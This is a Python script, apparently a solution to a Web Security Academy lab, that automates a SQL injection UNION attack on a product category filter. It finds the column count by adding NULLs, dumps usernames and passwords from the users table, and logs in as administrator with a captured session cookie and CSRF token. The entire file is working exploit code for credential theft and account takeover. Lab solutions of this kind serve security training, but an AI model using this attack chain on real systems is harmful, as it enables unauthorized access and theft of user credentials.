import requests
from bs4 import BeautifulSoup
url = 'https://0aed006704596a1380c7cb1c002e0091.web-security-academy.net/'

response = requests.get(url)


url = 'https://0aed006704596a1380c7cb1c002e0091.web-security-academy.net/filter?category=\'%20UNION%20SELECT'
# print(response.text)
# print(response)

temp = '%20NULL--'
fullurl = ''
count = 1
while True:
    fullurl = url + temp
    response=requests.get(fullurl)
    print(fullurl)
    print(response.status_code)
    if response.status_code == 200:
        break
    temp = "%20NULL," + temp
    count = count + 1

url = url + "%20username,password%20FROM%20users--"
response=requests.get(url)
print(response.text)

soup = BeautifulSoup(response.text, 'html.parser')
table = soup.find('table', class_='is-table-longdescription')
rows = table.find_all('tr')

headers = {
    'Host': '0aed006704596a1380c7cb1c002e0091.web-security-academy.net',
    'Cookie': 'session=BRe8YBM2M5b4htc9gdI1t0bPNDA3Q9MM',
    'Content-Length': '59',
    'Cache-Control': 'max-age=0',
    'Sec-Ch-Ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Linux"',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'https://0aed006704596a1380c7cb1c002e0091.web-security-academy.net',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Referer': 'https://0aed006704596a1380c7cb1c002e0091.web-security-academy.net/login',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9'
}

for row in rows:
    cells=row.find_all('th')
    username = cells[0].text.strip()
    print(f"Username: {username}")

    cells = row.find_all('td')
    password = cells[0].text.strip()
    print(f"Password: {password}")

    if(username == 'administrator'):
        login_url = 'https://0aed006704596a1380c7cb1c002e0091.web-security-academy.net/login'
        payload = {'csrf': '9y0WWbdnDuzyZfpBL0ZdTXfYjyaiHsyt', 'username': username, 'password': password}
        login_response = requests.post(login_url,headers=headers, data=payload)
        print(login_response)
